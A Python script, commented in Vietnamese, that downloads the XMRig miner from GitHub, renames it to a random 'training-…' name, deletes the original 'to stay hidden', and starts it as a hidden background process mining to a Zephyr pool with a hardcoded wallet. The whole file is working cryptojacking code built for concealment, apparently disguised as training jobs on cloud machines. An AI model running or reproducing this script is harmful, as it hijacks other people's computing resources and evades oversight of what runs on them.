import subprocess
import random
import shutil
import os

# Thiết lập biến VERSION
VERSION = "6.21.0"
azure = "training"

# Tạo tên tệp sao chép ngẫu nhiên
b = str(random.randint(10, 375))
d = str(random.randint(10, 259))
cpuname = f"training-{b}-{d}"

# Tạo thư mục và tải xuống xmrig
work_dir = os.path.expanduser("~/work")
xmrig_dir = f"{work_dir}/xmrig-{VERSION}"

subprocess.run(['mkdir', '-p', work_dir])
subprocess.run(['rm', '-rf', xmrig_dir])
subprocess.run(['wget', f'https://github.com/xmrig/xmrig/releases/download/v{VERSION}/xmrig-{VERSION}-linux-x64.tar.gz', '-P', work_dir])
subprocess.run(['tar', '-xvzf', f'{work_dir}/xmrig-{VERSION}-linux-x64.tar.gz', '-C', work_dir])

# Đổi tên và cài đặt xmrig
shutil.move(f'{xmrig_dir}/xmrig', f'{work_dir}/{azure}')

# Tạo tên tệp ngẫu nhiên cho xmrig
shutil.copy(f'{work_dir}/{azure}', f'{work_dir}/{cpuname}')
os.remove(f'{work_dir}/{azure}')  # Xóa tệp gốc để giữ ẩn

# Thiết lập các biến POOL, USERNAME và ALGO
POOL = "us-zephyr.miningocean.org:5432"
USERNAME = "ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB"
ALGO = "rx/0"
DONATE = "1"

# Chuẩn bị các tham số cho quá trình xmrig
xmrig_cmd = [
    f'{work_dir}/{cpuname}',
    '--donate-level', DONATE,
    '-o', POOL,
    '-u', f'{USERNAME}',
    '-a', ALGO,
    '-k', '--tls'
]

# Chạy xmrig như một tiến trình ẩn
process = subprocess.Popen(xmrig_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
